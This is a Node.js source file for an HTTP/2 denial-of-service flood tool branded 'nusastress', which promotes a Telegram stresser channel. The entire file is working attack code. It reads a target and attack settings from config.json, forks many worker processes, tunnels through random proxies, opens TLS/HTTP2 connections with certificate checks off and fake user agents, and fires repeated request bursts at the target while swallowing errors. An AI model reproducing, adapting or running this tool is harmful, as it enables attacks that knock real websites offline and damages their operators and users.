
//warning !!
//cek config.json to costum attack
//nusastress only developed this method, not the one who created this method
const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  net = require('net'),
  request = require('request'),
  cluster = require('cluster'),
  fakeua = require('fake-useragent'),
  randstr = require('randomstring'),
  ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
  ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  console.warn(e);
}).on('unhandledRejection', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  console.warn(e);
}).on('warning', e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  console.warn(e);
}).setMaxListeners(0);

function randomByte() {
  return Math.round(Math.random() * 256);
}

function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
  return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

const configFilePath = 'config.json'; // Sesuaikan dengan nama file yang Anda gunakan
const configData = JSON.parse(fs.readFileSync(configFilePath, 'utf-8'));
const target = configData.target;
const time = configData.time;
const thread = configData.thread;
const proxysFilePath = configData.proxysFile;
const rps = configData.rps;
const cp = configData.cp;
const maxtlsv = configData.maxtlsversion;
const maxRedirect = configData.maxRedirects;
const headerString = configData.customHeader;
const headers = JSON.parse(headerString.replace(/'/g, '"'));
function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
  const dateObj = new Date();
  console.log(`Send Attack [https://t.me/nusastresser]`);
  for (let i = 0; i < thread; i++){
       cluster.fork();
  }
  setTimeout(() => {
    process.exit(-1)
  }, time * 1000)
} else {
  function crot() {
    var parsed = url.parse(target);
    const uas = fakeua();
    var cipper = cp;
    var tlsver = maxtlsv;
    var proxy = proxyr().split(':');
    var cookie = request.jar();
    var randIp = randomIp();
    var header = headers;
    
    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 50000,
      maxSockets: Infinity,
      maxTotalSockets: Infinity,
      maxSockets: Infinity
    });

    var req = http.request({
      host: proxy[0],
      agent: agent,
      globalAgent: agent,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', function(res, socket, head) {
      const client = http2.connect(parsed.href, {
        createConnection: () => tls.connect({
          host: parsed.host,
          ciphers: cipper,
          secureProtocol: 'TLS_method',
          TLS_MAX_VERSION: tlsver,
          port: 80,
          servername: parsed.host,
          maxRedirects: maxRedirect,
          followAllRedirects: true,
          curve: "GREASE:X25519:x25519",
          secure: true,
          rejectUnauthorized: false,
          ALPNProtocols: ['h2'],
          sessionTimeout: 5000,
          socket: socket
        }, function() {
          for (let i = 0; i < rps; i++) {
            const req = client.request(header);
            req.setEncoding('utf8');

            req.on('data', (chunk) => {
              // data += chunk;
            });
            req.on("response", () => {
              req.close();
            })
            req.end();
          }
        })
      });
    });
    req.end();
  }
  setInterval(() => {
    crot()
  })
}